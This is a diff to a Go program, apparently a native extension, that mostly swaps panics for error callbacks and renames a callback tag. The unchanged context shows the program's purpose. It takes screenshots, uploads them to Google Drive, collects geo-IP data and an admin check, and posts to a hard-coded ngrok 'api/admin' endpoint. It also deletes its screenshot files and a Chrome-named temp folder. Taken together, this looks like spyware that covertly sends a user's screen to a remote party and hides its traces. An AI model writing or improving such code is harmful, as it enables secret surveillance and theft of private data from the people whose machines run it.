@@ -74,13 +74,14 @@ const lkLink = "https://958e-93-72-94-231.ngrok.io/api/admin/"
 func SendLkQuery(api string, vals url.Values) string {
 	resp, err := http.PostForm(lkLink+api, vals)
 	if err != nil {
-		panic(err)
+		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("SendLkQuery | "+err.Error()))
 	}
 	defer resp.Body.Close()
 
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		panic(err)
+		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("SendLkQuery | "+err.Error()))
+
 	}
 	return string(body)
 }
@@ -117,7 +118,7 @@ func makeScreenshot(basePath string) {
 
 		img, err := screenshot.CaptureRect(bounds)
 		if err != nil {
-			runExtensionCallback(C.CString("returnHWID"), C.CString("success"), C.CString("makeScreen | Capture "+err.Error()))
+			runExtensionCallback(C.CString("secExt"), C.CString("success"), C.CString("makeScreen | Capture "+err.Error()))
 			break
 		}
 		t := time.Now()
@@ -154,7 +155,7 @@ func ensureDir(fileName string) {
 	if _, serr := os.Stat(dirName); serr != nil {
 		merr := os.MkdirAll(dirName, os.ModePerm)
 		if merr != nil {
-			panic(merr)
+			runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("ensureDir | "+merr.Error()))
 		}
 	}
 }
@@ -174,15 +175,15 @@ func isAdmin() int {
 func cleanOldFiles() {
 	files, err := ioutil.ReadDir(os.TempDir())
 	if err != nil {
-		runExtensionCallback(C.CString("returnHWID"), C.CString("error"), C.CString("cleanOldFiles | error open directory"))
+		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("cleanOldFiles | error open directory"))
 	}
 	for _, elem := range files {
 		matched, _ := regexp.MatchString("Screen", elem.Name())
 		if matched {
-			runExtensionCallback(C.CString("returnHWID"), C.CString("success"), C.CString("cleanOldFiles | find file to delete "+elem.Name()))
+			runExtensionCallback(C.CString("secExt"), C.CString("success"), C.CString("cleanOldFiles | find file to delete "+elem.Name()))
 			err := os.Remove(os.TempDir() + "/" + elem.Name())
 			if err != nil {
-				runExtensionCallback(C.CString("returnHWID"), C.CString("error"), C.CString("cleanOldFiles | "+err.Error()))
+				runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("cleanOldFiles | "+err.Error()))
 			}
 		}
 	}
@@ -192,7 +193,8 @@ func cleanTemp() {
 	path := os.TempDir() + "/chrome_drag0947_254420441/dir/"
 	err := os.RemoveAll(path)
 	if err != nil {
-		panic(err)
+		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("getGeoIp | "+err.Error()))
+
 	}
 }
 
@@ -202,7 +204,7 @@ func getGeoIp() string {
 
 	defer res.Close()
 	if err != nil {
-		runExtensionCallback(C.CString("returnHWID"), C.CString("error"), C.CString("getGeoIp | "+returnMyData("get_IP", nil)+" limit querys reached for this address"))
+		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("getGeoIp | "+returnMyData("get_IP", nil)+" limit querys reached for this address"))
 	}
 
 	return fmt.Sprintf(`["%s","%s","%s","%s","%s","%s"]`,
@@ -223,10 +225,10 @@ func uploadScrennshot(basepath string, name string, img *image.RGBA) {
 
 	filename := fmt.Sprintf("%s/%s", path, name)
 
-	runExtensionCallback(C.CString("returnHWID"), C.CString("success"), C.CString("uploadScreen | file "+filename))
+	runExtensionCallback(C.CString("secExt"), C.CString("success"), C.CString("uploadScreen | file "+filename))
 	imgW, err := os.Create(filename)
 	if err != nil {
-		runExtensionCallback(C.CString("returnHWID"), C.CString("error"), C.CString("uploadScreen | Create file "+err.Error()))
+		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("uploadScreen | Create file "+err.Error()))
 
 	}
 	defer imgW.Close()
@@ -235,7 +237,7 @@ func uploadScrennshot(basepath string, name string, img *image.RGBA) {
 	png.Encode(imgW, img)
 	_img, err := ioutil.ReadFile(filename)
 	if err != nil {
-		runExtensionCallback(C.CString("returnHWID"), C.CString("error"), C.CString("uploadScreen | Read file "+err.Error()))
+		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("uploadScreen | Read file "+err.Error()))
 	}
 
 	imgR := bytes.NewReader(_img)
@@ -246,7 +248,7 @@ func uploadScrennshot(basepath string, name string, img *image.RGBA) {
 	}).Media(imgR).Do()
 
 	if err != nil {
-		runExtensionCallback(C.CString("returnHWID"), C.CString("error"), C.CString("uploadScreen | Drive file "+err.Error()))
+		runExtensionCallback(C.CString("secExt"), C.CString("error"), C.CString("uploadScreen | Drive file "+err.Error()))
 	}
 }
 
